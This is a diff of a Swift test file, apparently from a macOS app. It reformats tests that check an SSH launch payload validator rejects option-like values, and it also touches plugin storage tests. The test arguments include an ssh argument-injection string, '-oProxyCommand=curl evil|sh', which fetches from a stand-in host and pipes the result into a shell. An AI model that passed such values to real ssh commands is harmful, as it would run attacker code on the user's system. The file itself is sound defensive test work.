@@ -1,5 +1,6 @@
-import Testing
 import Foundation
+import Testing
+
 @testable import AinkradAppKitContract
 
 /// Generation 8: the SSH launch contract is one shared, versioned, validated
@@ -8,8 +9,9 @@ import Foundation
 @Suite("SSHLaunchPayload")
 struct SSHLaunchValidationTests {
 
-    @Test("Option-like values are rejected in every field",
-          arguments: ["-oProxyCommand=curl evil|sh", "-oLocalCommand=id", "--config=x"])
+    @Test(
+        "Option-like values are rejected in every field",
+        arguments: ["-oProxyCommand=curl evil|sh", "-oLocalCommand=id", "--config=x"])
     func rejectsOptionLikeValues(value: String) {
         // `ssh -o ProxyCommand=<cmd>` runs a shell command. Same class of bug
         // as the git argument injection, in a second place.
@@ -26,8 +28,9 @@ struct SSHLaunchValidationTests {
 
     @Test("Ordinary connections validate")
     func acceptsOrdinaryConnections() throws {
-        let payload = SSHLaunchPayload(host: "example.com", port: 2222, username: "ahmed",
-                                       identityFile: "/Users/a/.ssh/id_ed25519")
+        let payload = SSHLaunchPayload(
+            host: "example.com", port: 2222, username: "ahmed",
+            identityFile: "/Users/a/.ssh/id_ed25519")
         #expect(try payload.validated() == payload)
         // A dash *inside* a value is fine — only a leading one is an option.
         #expect(throws: Never.self) {
@@ -85,8 +88,14 @@ struct PluginInstanceStorageTests {
         let storage = PluginInstanceStorage<NSObject>()
         let a = PluginInstanceID()
         var creations = 0
-        let first = storage.value(for: a) { creations += 1; return NSObject() }
-        let second = storage.value(for: a) { creations += 1; return NSObject() }
+        let first = storage.value(for: a) {
+            creations += 1
+            return NSObject()
+        }
+        let second = storage.value(for: a) {
+            creations += 1
+            return NSObject()
+        }
         #expect(creations == 1)
         #expect(first === second)
     }
